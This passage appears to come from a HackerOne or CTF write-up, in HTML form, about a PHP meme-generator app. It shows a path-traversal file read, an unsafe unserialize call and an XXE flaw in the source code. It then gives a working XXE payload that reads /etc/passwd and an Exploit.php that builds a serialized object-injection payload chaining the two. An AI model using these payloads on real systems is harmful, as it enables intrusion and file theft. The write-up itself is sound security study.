DczQQAjcVHP0T4iXvprpJ7WF4Lgvdg6C%2FwSgLkD8N%2BofGZQflIFdduF6tbfUDe6RZqExPuAHXZR8zPF7DVwtnOckvWNNJFfV2j3cG1J4PetkJkxnwBNpnZP4nCyTKbwMPXXPODGNKYyXAqp3Qy95YBxWsTYos6qm4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=c39dd089b29dc5e416af10f16d388181015f85a74d7590cc8a22a322c8cf50c3\" class=\"markdown-inline-image\"></a></p>\n\n<p>The template parameter was vulnerable to local file read it take the file name available on the system and if present then it uses to create meme by adding the <strong>Top</strong> and <strong>Bottom</strong> Text.<br>\n<a href=\"#\" class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"Screen_Shot_2018-09-29_at_4.40.12_AM.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/352/576/0bae2a5bf172b379425539effd162aa2937a6557/Screen_Shot_2018-09-29_at_4.40.12_AM.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQWYI2GPWO%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T221523Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA8aDGZ9hZPNXy0op0dbUCK3A2FIHB%2BibDXwZCFl83WTNlShweklDkKhtUNsdiH1ZDSlGSdLObBpyGJdCeuHTlImqCYdt8f2yBKifOTf2TivYpJrNHupdtHvnqAWi7W9%2BjwJ%2BTCwiOrcStmIDnFCyyqwY6TAI5WG5MrEEDv8wrLdp996xp151lj%2F4um2Zv496W8ro76jvQ88joGdHpQVXnNfV1GVszM9x2MSCQxnQNnSXcnSWseYTKLzyFp0ZHOTPrPzq2uSlVkK%2F3QymE%2FxPIDTGw0YAH0dkxUT6j5w6dpcr%2BrzhYkptWupenUAF0MVqKJxNJZkBP3vJojReAQxLLf6Q5HsYqGm6jhS4748ZyTRZgChKL9lshIjpbjIu5MbLvwX%2F27PaXT7zSgwK903viGfy%2Bho9qoZUssvAToQJIzp0gqB8TNCETjgLLeFaQk13faNP%2Bs6DczQQAjcVHP0T4iXvprpJ7WF4Lgvdg6C%2FwSgLkD8N%2BofGZQflIFdduF6tbfUDe6RZqExPuAHXZR8zPF7DVwtnOckvWNNJFfV2j3cG1J4PetkJkxnwBNpnZP4nCyTKbwMPXXPODGNKYyXAqp3Qy95YBxWsTYos6qm4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=a20bc60a8b2621da7c9abf4c0b6e51105ba374a96805a04fe240c2e11f0a139e\" data-attachment-type=\"image/png\"><img src=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/352/576/0bae2a5bf172b379425539effd162aa2937a6557/Screen_Shot_2018-09-29_at_4.40.12_AM.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQWYI2GPWO%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T221523Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA8aDGZ9hZPNXy0op0dbUCK3A2FIHB%2BibDXwZCFl83WTNlShweklDkKhtUNsdiH1ZDSlGSdLObBpyGJdCeuHTlImqCYdt8f2yBKifOTf2TivYpJrNHupdtHvnqAWi7W9%2BjwJ%2BTCwiOrcStmIDnFCyyqwY6TAI5WG5MrEEDv8wrLdp996xp151lj%2F4um2Zv496W8ro76jvQ88joGdHpQVXnNfV1GVszM9x2MSCQxnQNnSXcnSWseYTKLzyFp0ZHOTPrPzq2uSlVkK%2F3QymE%2FxPIDTGw0YAH0dkxUT6j5w6dpcr%2BrzhYkptWupenUAF0MVqKJxNJZkBP3vJojReAQxLLf6Q5HsYqGm6jhS4748ZyTRZgChKL9lshIjpbjIu5MbLvwX%2F27PaXT7zSgwK903viGfy%2Bho9qoZUssvAToQJIzp0gqB8TNCETjgLLeFaQk13faNP%2Bs6DczQQAjcVHP0T4iXvprpJ7WF4Lgvdg6C%2FwSgLkD8N%2BofGZQflIFdduF6tbfUDe6RZqExPuAHXZR8zPF7DVwtnOckvWNNJFfV2j3cG1J4PetkJkxnwBNpnZP4nCyTKbwMPXXPODGNKYyXAqp3Qy95YBxWsTYos6qm4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=a20bc60a8b2621da7c9abf4c0b6e51105ba374a96805a04fe240c2e11f0a139e\" class=\"markdown-inline-image\"></a> </p>\n\n<p><a href=\"#\" class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"Screen_Shot_2018-09-29_at_4.40.21_AM.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/352/577/4a90440224dcf5ca99e9b47a9847ab4c55a5c2b3/Screen_Shot_2018-09-29_at_4.40.21_AM.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQWYI2GPWO%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T221523Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA8aDGZ9hZPNXy0op0dbUCK3A2FIHB%2BibDXwZCFl83WTNlShweklDkKhtUNsdiH1ZDSlGSdLObBpyGJdCeuHTlImqCYdt8f2yBKifOTf2TivYpJrNHupdtHvnqAWi7W9%2BjwJ%2BTCwiOrcStmIDnFCyyqwY6TAI5WG5MrEEDv8wrLdp996xp151lj%2F4um2Zv496W8ro76jvQ88joGdHpQVXnNfV1GVszM9x2MSCQxnQNnSXcnSWseYTKLzyFp0ZHOTPrPzq2uSlVkK%2F3QymE%2FxPIDTGw0YAH0dkxUT6j5w6dpcr%2BrzhYkptWupenUAF0MVqKJxNJZkBP3vJojReAQxLLf6Q5HsYqGm6jhS4748ZyTRZgChKL9lshIjpbjIu5MbLvwX%2F27PaXT7zSgwK903viGfy%2Bho9qoZUssvAToQJIzp0gqB8TNCETjgLLeFaQk13faNP%2Bs6DczQQAjcVHP0T4iXvprpJ7WF4Lgvdg6C%2FwSgLkD8N%2BofGZQflIFdduF6tbfUDe6RZqExPuAHXZR8zPF7DVwtnOckvWNNJFfV2j3cG1J4PetkJkxnwBNpnZP4nCyTKbwMPXXPODGNKYyXAqp3Qy95YBxWsTYos6qm4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=de900583a7d6faf705f19b418794d043c2e0b82f56c4e673af3a90ba75249f58\" data-attachment-type=\"image/png\"><img src=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/352/577/4a90440224dcf5ca99e9b47a9847ab4c55a5c2b3/Screen_Shot_2018-09-29_at_4.40.21_AM.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQWYI2GPWO%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T221523Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA8aDGZ9hZPNXy0op0dbUCK3A2FIHB%2BibDXwZCFl83WTNlShweklDkKhtUNsdiH1ZDSlGSdLObBpyGJdCeuHTlImqCYdt8f2yBKifOTf2TivYpJrNHupdtHvnqAWi7W9%2BjwJ%2BTCwiOrcStmIDnFCyyqwY6TAI5WG5MrEEDv8wrLdp996xp151lj%2F4um2Zv496W8ro76jvQ88joGdHpQVXnNfV1GVszM9x2MSCQxnQNnSXcnSWseYTKLzyFp0ZHOTPrPzq2uSlVkK%2F3QymE%2FxPIDTGw0YAH0dkxUT6j5w6dpcr%2BrzhYkptWupenUAF0MVqKJxNJZkBP3vJojReAQxLLf6Q5HsYqGm6jhS4748ZyTRZgChKL9lshIjpbjIu5MbLvwX%2F27PaXT7zSgwK903viGfy%2Bho9qoZUssvAToQJIzp0gqB8TNCETjgLLeFaQk13faNP%2Bs6DczQQAjcVHP0T4iXvprpJ7WF4Lgvdg6C%2FwSgLkD8N%2BofGZQflIFdduF6tbfUDe6RZqExPuAHXZR8zPF7DVwtnOckvWNNJFfV2j3cG1J4PetkJkxnwBNpnZP4nCyTKbwMPXXPODGNKYyXAqp3Qy95YBxWsTYos6qm4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=de900583a7d6faf705f19b418794d043c2e0b82f56c4e673af3a90ba75249f58\" class=\"markdown-inline-image\"></a></p>\n\n<h2 id=\"analysing-the-source-code\">Analysing the source code</h2>\n\n<p>Since we have local file read we can download the source code of the application. by just changing the template parameter to 2 directory up <code>../../</code>.<br>\n<a href=\"#\" class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"Screen_Shot_2018-09-29_at_4.46.28_AM.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/352/580/bbb6847b688cbebbd0fc0dfd4f7edb6131da3845/Screen_Shot_2018-09-29_at_4.46.28_AM.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQWYI2GPWO%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T221523Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA8aDGZ9hZPNXy0op0dbUCK3A2FIHB%2BibDXwZCFl83WTNlShweklDkKhtUNsdiH1ZDSlGSdLObBpyGJdCeuHTlImqCYdt8f2yBKifOTf2TivYpJrNHupdtHvnqAWi7W9%2BjwJ%2BTCwiOrcStmIDnFCyyqwY6TAI5WG5MrEEDv8wrLdp996xp151lj%2F4um2Zv496W8ro76jvQ88joGdHpQVXnNfV1GVszM9x2MSCQxnQNnSXcnSWseYTKLzyFp0ZHOTPrPzq2uSlVkK%2F3QymE%2FxPIDTGw0YAH0dkxUT6j5w6dpcr%2BrzhYkptWupenUAF0MVqKJxNJZkBP3vJojReAQxLLf6Q5HsYqGm6jhS4748ZyTRZgChKL9lshIjpbjIu5MbLvwX%2F27PaXT7zSgwK903viGfy%2Bho9qoZUssvAToQJIzp0gqB8TNCETjgLLeFaQk13faNP%2Bs6DczQQAjcVHP0T4iXvprpJ7WF4Lgvdg6C%2FwSgLkD8N%2BofGZQflIFdduF6tbfUDe6RZqExPuAHXZR8zPF7DVwtnOckvWNNJFfV2j3cG1J4PetkJkxnwBNpnZP4nCyTKbwMPXXPODGNKYyXAqp3Qy95YBxWsTYos6qm4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=9b8976bd9d26e4a1d2e4d11c289e4effe4cb6d4b36e8746e18dc48e9f1e9ba56\" data-attachment-type=\"image/png\"><img src=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/352/580/bbb6847b688cbebbd0fc0dfd4f7edb6131da3845/Screen_Shot_2018-09-29_at_4.46.28_AM.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQWYI2GPWO%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T221523Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA8aDGZ9hZPNXy0op0dbUCK3A2FIHB%2BibDXwZCFl83WTNlShweklDkKhtUNsdiH1ZDSlGSdLObBpyGJdCeuHTlImqCYdt8f2yBKifOTf2TivYpJrNHupdtHvnqAWi7W9%2BjwJ%2BTCwiOrcStmIDnFCyyqwY6TAI5WG5MrEEDv8wrLdp996xp151lj%2F4um2Zv496W8ro76jvQ88joGdHpQVXnNfV1GVszM9x2MSCQxnQNnSXcnSWseYTKLzyFp0ZHOTPrPzq2uSlVkK%2F3QymE%2FxPIDTGw0YAH0dkxUT6j5w6dpcr%2BrzhYkptWupenUAF0MVqKJxNJZkBP3vJojReAQxLLf6Q5HsYqGm6jhS4748ZyTRZgChKL9lshIjpbjIu5MbLvwX%2F27PaXT7zSgwK903viGfy%2Bho9qoZUssvAToQJIzp0gqB8TNCETjgLLeFaQk13faNP%2Bs6DczQQAjcVHP0T4iXvprpJ7WF4Lgvdg6C%2FwSgLkD8N%2BofGZQflIFdduF6tbfUDe6RZqExPuAHXZR8zPF7DVwtnOckvWNNJFfV2j3cG1J4PetkJkxnwBNpnZP4nCyTKbwMPXXPODGNKYyXAqp3Qy95YBxWsTYos6qm4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=9b8976bd9d26e4a1d2e4d11c289e4effe4cb6d4b36e8746e18dc48e9f1e9ba56\" class=\"markdown-inline-image\"></a></p>\n\n<p>In this way I have downloaded the source code of the application one by one and arranged it to according to the web application.<br>\n<a href=\"#\" class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"Screen_Shot_2018-09-29_at_4.49.32_AM.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/352/584/34413dcdda8ea632bfbdece2aa786d7a6181f723/Screen_Shot_2018-09-29_at_4.49.32_AM.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQWYI2GPWO%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T221523Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA8aDGZ9hZPNXy0op0dbUCK3A2FIHB%2BibDXwZCFl83WTNlShweklDkKhtUNsdiH1ZDSlGSdLObBpyGJdCeuHTlImqCYdt8f2yBKifOTf2TivYpJrNHupdtHvnqAWi7W9%2BjwJ%2BTCwiOrcStmIDnFCyyqwY6TAI5WG5MrEEDv8wrLdp996xp151lj%2F4um2Zv496W8ro76jvQ88joGdHpQVXnNfV1GVszM9x2MSCQxnQNnSXcnSWseYTKLzyFp0ZHOTPrPzq2uSlVkK%2F3QymE%2FxPIDTGw0YAH0dkxUT6j5w6dpcr%2BrzhYkptWupenUAF0MVqKJxNJZkBP3vJojReAQxLLf6Q5HsYqGm6jhS4748ZyTRZgChKL9lshIjpbjIu5MbLvwX%2F27PaXT7zSgwK903viGfy%2Bho9qoZUssvAToQJIzp0gqB8TNCETjgLLeFaQk13faNP%2Bs6DczQQAjcVHP0T4iXvprpJ7WF4Lgvdg6C%2FwSgLkD8N%2BofGZQflIFdduF6tbfUDe6RZqExPuAHXZR8zPF7DVwtnOckvWNNJFfV2j3cG1J4PetkJkxnwBNpnZP4nCyTKbwMPXXPODGNKYyXAqp3Qy95YBxWsTYos6qm4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=67b18433ce4aa288e9bef762c08c3fb6acb5113c367536b217aedc43af9cd748\" data-attachment-type=\"image/png\"><img src=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/352/584/34413dcdda8ea632bfbdece2aa786d7a6181f723/Screen_Shot_2018-09-29_at_4.49.32_AM.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQWYI2GPWO%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T221523Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA8aDGZ9hZPNXy0op0dbUCK3A2FIHB%2BibDXwZCFl83WTNlShweklDkKhtUNsdiH1ZDSlGSdLObBpyGJdCeuHTlImqCYdt8f2yBKifOTf2TivYpJrNHupdtHvnqAWi7W9%2BjwJ%2BTCwiOrcStmIDnFCyyqwY6TAI5WG5MrEEDv8wrLdp996xp151lj%2F4um2Zv496W8ro76jvQ88joGdHpQVXnNfV1GVszM9x2MSCQxnQNnSXcnSWseYTKLzyFp0ZHOTPrPzq2uSlVkK%2F3QymE%2FxPIDTGw0YAH0dkxUT6j5w6dpcr%2BrzhYkptWupenUAF0MVqKJxNJZkBP3vJojReAQxLLf6Q5HsYqGm6jhS4748ZyTRZgChKL9lshIjpbjIu5MbLvwX%2F27PaXT7zSgwK903viGfy%2Bho9qoZUssvAToQJIzp0gqB8TNCETjgLLeFaQk13faNP%2Bs6DczQQAjcVHP0T4iXvprpJ7WF4Lgvdg6C%2FwSgLkD8N%2BofGZQflIFdduF6tbfUDe6RZqExPuAHXZR8zPF7DVwtnOckvWNNJFfV2j3cG1J4PetkJkxnwBNpnZP4nCyTKbwMPXXPODGNKYyXAqp3Qy95YBxWsTYos6qm4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=67b18433ce4aa288e9bef762c08c3fb6acb5113c367536b217aedc43af9cd748\" class=\"markdown-inline-image\"></a></p>\n\n<p><strong>Finding vulnerability in Import memes( /api/import_memes_2.0.php)</strong> : It was taking a file with serialised data with base64 encoded and then merging the files array in the session. </p>\n<pre class=\"highlight plaintext\"><code>&lt;?php\n  require_once(&quot;../includes/config.php&quot;);\n\n  if (isset($_FILES[&#39;f&#39;])) {\n    $new_memes = unserialize(base64_decode(file_get_contents($_FILES[&#39;f&#39;][&#39;tmp_name&#39;])));\n\n    $_SESSION[&#39;memes&#39;] = array_merge($_SESSION[&#39;memes&#39;], $new_memes);\n  }\n\n  header(&quot;Location: /memes.php&quot;);\n?&gt;\n</code></pre>\n<p><strong>Finding vulnerability in classes.php</strong>  The <code>libxml_disable_entity_loader(false);</code> which disables the entity loader if the value is true. Since it was set to false so it allowed to load external entities.</p>\n<pre class=\"highlight plaintext\"><code>class ConfigFile {\n\n    function __construct($url) {\n      $this-&gt;config_raw = file_get_contents($url);\n    }\n\n    function parse() {\n      $dom = new DOMDocument();\n      $dom-&gt;loadXML($this-&gt;config_raw, LIBXML_NOENT | LIBXML_DTDLOAD);\n      $o = simplexml_import_dom($dom);\n\n      $this-&gt;top_text = $o-&gt;toptext;\n      $this-&gt;bottom_text = $o-&gt;bottomtext;\n      $this-&gt;template = $o-&gt;template;\n      $this-&gt;type = $o-&gt;type;\n    }\n\n    function generate() {\n      $this-&gt;parse();\n\n      $meme_path = &quot;https://giphy.com/embed/Vuw9m5wXviFIQ?try_harder&quot;;\n\n      if ($this-&gt;type == IMAGE) {\n        if (@is_array(getimagesize($this-&gt;path))) {\n          $meme_path = MEMES_FOLDER . $filename . &quot;.jpg&quot;;\n\n          $args = array(\n            &quot;top_text&quot;    =&gt; $top_text,\n            &quot;bottom_text&quot; =&gt; $bottom_text,\n            &quot;filename&quot;    =&gt; $meme_path,\n            &quot;font&quot;        =&gt; FONT_BASE,\n            &quot;memebase&quot;    =&gt; $this-&gt;path,\n            &quot;textsize&quot;    =&gt; 40,\n            &quot;textfit&quot;     =&gt; true,\n            &quot;padding&quot;     =&gt; 10,\n          );\n\n          memegen_build_image($args);\n        }\n      }\n\n      if ($this-&gt;type == TEXT) {\n        if (!@is_array(getimagesize($this-&gt;path))) {\n          $contents = file_get_contents($this-&gt;path);\n          $meme = &quot;  &quot; . strtoupper($top_text) . &quot;\\n\\n&quot; . $contents . &quot;\\n  &quot; . strtoupper($bottom_text);\n          $meme_path = MEMES_FOLDER . $filename . &quot;.txt&quot;;\n          file_put_contents($meme_path, $meme);\n        }\n      }\n\n      return $meme_path;\n    }\n\n    function __toString() {\n      $this-&gt;parse();\n      $debug = &quot;&quot;;\n      $debug .= &quot;Debug Info :\\n&quot;;\n      $debug .= &quot;TopText =&gt; {$this-&gt;top_text}\\n&quot;;\n      $debug .= &quot;BottomText =&gt; {$this-&gt;bottom_text}\\n&quot;;\n      $debug .= &quot;Template Location =&gt; {$this-&gt;template}\\n&quot;;\n      $debug .= &quot;Template Type =&gt; {$this-&gt;type}\\n&quot;;\n      return $debug;\n    }\n  }\n</code></pre>\n<p>The <code>parse()</code> function was was parsing the xml entities with the desired elements(toptext, bottomtext, type, template). which makes it vulnerable to XXE. But till now we don&#39;t have any direct way to exploit XXE. The attack was intended to chain with each other. but to exploit the php object injection the magic method <code>__toString()</code> needs to be called because only <code>__wakup()</code> gets called when unserialize is used but here no wakeup method so. But I investigated the code and found a way where <code>__toString()</code> is called there is a loop is meme.php when the session is getting echoed there our uploaded file gets echoed too.</p>\n\n<h3 id=\"xml-payload\">XML Payload :</h3>\n<pre class=\"highlight xml\"><code><span class=\"cp\">&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;</span> ]&gt;<span class=\"nt\">&lt;root&gt;</span>\n    <span class=\"nt\">&lt;toptext&gt;</span><span class=\"ni\">&amp;xxe;</span><span class=\"nt\">&lt;/toptext&gt;</span>\n    <span class=\"nt\">&lt;bottomtext&gt;</span>xd<span class=\"nt\">&lt;/bottomtext&gt;</span>\n    <span class=\"nt\">&lt;template&gt;&lt;/template&gt;</span>\n    <span class=\"nt\">&lt;type&gt;</span>text<span class=\"nt\">&lt;/type&gt;</span>\n<span class=\"nt\">&lt;/root&gt;</span>\n</code></pre>\n<h3 id=\"serialised-payload-base64-decoded\">Serialised payload (base64 Decoded):</h3>\n<pre class=\"highlight plaintext\"><code>O:10:&quot;ConfigFile&quot;:1:{s:10:&quot;config_raw&quot;;s:170:&quot;&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt; ]&gt;&lt;root&gt;\n    &lt;toptext&gt;&amp;xxe;&lt;/toptext&gt;\n    &lt;bottomtext&gt;xd&lt;/bottomtext&gt;\n    &lt;template&gt;&lt;/template&gt;\n    &lt;type&gt;text&lt;/type&gt;\n&lt;/root&gt;&quot;;}\n</code></pre>\n<h2 id=\"exploit-for-generating-the-serialised-data\">Exploit for generating the serialised data :</h2>\n\n<p><strong>Exploit.php</strong></p>\n<pre class=\"highlight plaintext\"><code>&lt;?php\n\nclass ConfigFile{\n        public $config_raw = &#39;&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt; ]&gt;&lt;root&gt;\n    &lt;toptext&gt;&amp;xxe;&lt;/toptext&gt;\n    &lt;bottomtext&gt;xd&lt;/bottomtext&gt;\n    &lt;template&gt;&lt;/template&gt;\n    &lt;type&gt;text&lt;/type&gt;\n&lt;/root&gt;&#39;;\n    }\n\n    echo base64_encode(serialize([new ConfigFile]));\n?&gt;\n</code></pre>\n<h2 id=\"chaining-xxe-with-php-object-injection-and-escalating\">Chaining XXE with PHP Object Injection and escalating:</h2>\n\n<p>So I have created an exploit which generates a serialised the data and encoded to base64.<br>\n<a href=\"#\" class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"Screen_Shot_2018-09-29_at_5.25.19_AM.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/352/605/d90692d4bf51b4ef86a42c64816b7972e931e29d/Screen_Shot_2018-09-29_at_5.25.19_AM.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQWYI2GPWO%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T221523Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA8aDGZ9hZPNXy0op0dbUCK3A2FIHB%2BibDXwZCFl83WTNlShweklDkKhtUNsdiH1ZDSlGSdLObBpyGJdCeuHTlImqCYdt8f2yBKifOTf2TivYpJrNHupdtHvnqAWi7W9%2BjwJ%2BTCwiOrcStmIDnFCyyqwY6TAI5WG5MrEEDv8wrLdp996xp151lj%2F4um2Zv496W8ro76jvQ88joGdHpQVXnNfV1GVszM9x2MSCQxnQNnSXcnSWseYTKLzyFp0ZHOTPrPzq2uSlVkK%2F3QymE%2FxPIDTGw0YAH0dkxUT6j5w6dpcr%2BrzhYkptWupenUAF0MVqKJxNJZkBP3vJojReAQxLLf6Q5HsYqGm6jhS4748ZyTRZgChKL9lshIjpbjIu5MbLvwX%2F27PaXT7zSgwK903viGfy%2Bho9qoZUssvAToQJIzp0gqB8TNCETjgLLeFaQk13faNP%2Bs6DczQQAjcVHP0T4iXvprpJ7WF4Lgvdg6C%2FwSgLkD8N%2BofGZQflIFdduF6tbfUDe6RZqExPuAHXZR8zPF7DVwtnOckvWNNJFfV2j3cG1J4PetkJkxnwBNpnZP4nCyTKbwMPXXPODGNKYyXAqp3Qy95YBxWsTYos6qm4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=5a326c65fa0a984fe62f9d13367c7e9e4f795a8d8446fb68856814acb4ef7757\" data-attachment-type=\"image/png\"><img src=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/352/605/d90692d4bf51b4ef86a42c64816b7972e931e29d/Screen_Shot_2018-09-29_at_5.25.19_AM.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQWYI2GPWO%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T221523Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA8aDGZ9hZPNXy0op0dbUCK3A2FIHB%2BibDXwZCFl83WTNlShweklDkKhtUNsdiH1ZDSlGSdLObBpyGJdCeuHTlImqCYdt8f2yBKifOTf2TivYpJrNHupdtHvnqAWi7W9%2BjwJ%2BTCwiOrcStmIDnFCyyqwY6TAI5WG5MrEEDv8wrLdp996xp151lj%2F4um2Zv496W8ro76jvQ88joGdHpQVXnNfV1GVszM9x2MSCQxnQNnSXcnSWseYTKLzyFp0ZHOTPrPzq2uSlVkK%2F3QymE%2FxPIDTGw0YAH0dkxUT6j5w6dpcr%2BrzhYkptWupenUAF0MVqKJxNJZkBP3vJojReAQxLLf6Q5HsYqGm6jhS4748ZyTRZgChKL9lshIjpbjIu5MbLvwX%2F27PaXT7zSgwK903viGfy%2Bho9qoZUssvAToQJIzp0gqB8TNCETjgLLeFaQk13faNP%2Bs6DczQQAjcVHP0T4iXvprpJ7WF4Lgvdg6C%2FwSgLkD8N%2BofGZQflIFdduF6tbfUDe6RZqExPuAHXZR8zPF7DVwtnOckvWNNJFfV2j3cG1J4PetkJkxnwBNpnZP4nCyTKbwMPXXPODGNKYyXAqp3Qy95YBxWsTYos6qm4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=5a326c65fa0a984fe62f9d13367c7e9e4f795a8d8446fb68856814acb4ef7757\" class=\"markdown-inline-image\"></a></p>\n\n<p><a href=\"#\" class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"Screen_Shot_2018-09-29_at_5.25.11_AM.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/352/604/781ce46ff1d99dc06a3c1dcdcdcdd92f3f8c5cc1/Screen_Shot_2018-09-29_at_5.25.11_AM.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQWYI2GPWO%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T221523Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA8aDGZ9hZPNXy0op0dbUCK3A2FIHB%2BibDXwZCFl83WTNlShweklDkKhtUNsdiH1ZDSlGSdLObBpyGJdCeuHTlImqCYdt8f2yBKifOTf2TivYpJrNHupdtHvnqAWi7W9%2BjwJ%2BTCwiOrcStmIDnFCyyqwY6TAI5WG5MrEEDv8wrLdp996xp151lj%2F4um2Zv496W8ro76jvQ88joGdHpQVXnNfV1GVszM9x2MSCQxnQNnSXcnSWseYTKLzyFp0ZHOTPrPzq2uSlVkK%2F3QymE%2FxPIDTGw0YAH0dkxUT6j5w6dpcr%2BrzhYkptWupenUAF0MVqKJxNJZkBP3vJojReAQxLLf6Q5HsYqGm6jhS4748ZyTRZgChKL9lshIjpbjIu5MbLvwX%2F27PaXT7zSgwK903viGfy%2Bho9qoZUssvAToQJIzp0gqB8TNCETjgLLeFaQk13faNP%2Bs6DczQQAjcVHP0T4iXvprpJ7WF4Lgvdg6C%2FwSgLkD8N%2BofGZQflIFdduF6tbfUDe6RZqExPuAHXZR8zPF7DVwtnOckvWNNJFfV2j3cG1J4PetkJkxnwBNpnZP4nCyTKbwMPXXPODGNKYyXAqp3Qy95YBxWsTYos6qm4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=71e5b5243246a304114dae710aec37f1965c060cba7d54746d31675eec18dbd1\" data-attachment-type=\"image/png\"><img src=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/352/604/781ce46ff1d99dc06a3c1dcdcdcdd92f3f8c5cc1/Screen_Shot_2018-09-29_at_5.25.11_AM.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQWYI2GPWO%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T221523Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA8aDGZ9hZPNXy0op0dbUCK3A2FIHB%2BibDXwZCFl83WTNlShweklDkKhtUNsdiH1ZDSlGSdLObBpyGJdCeuHTlImqCYdt8f2yBKifOTf2TivYpJrNHupdtHvnqAWi7W9%2BjwJ%2BTCwiOrcStmIDnFCyyqwY6TAI5WG5MrEEDv8wrLdp996xp151lj%2F4um2Zv496W8ro76jvQ88joGdHpQVXnNfV1GVszM9x2MSCQxnQNnSXcnSWseYTKLzyFp0ZHOTPrPzq2uSlVkK%2F3QymE%2FxPIDTGw0YAH0dkxUT6j5w6dpcr%2BrzhYkptWupenUAF0MVqKJxNJZkBP3vJojReAQxLLf6Q5HsYqGm6jhS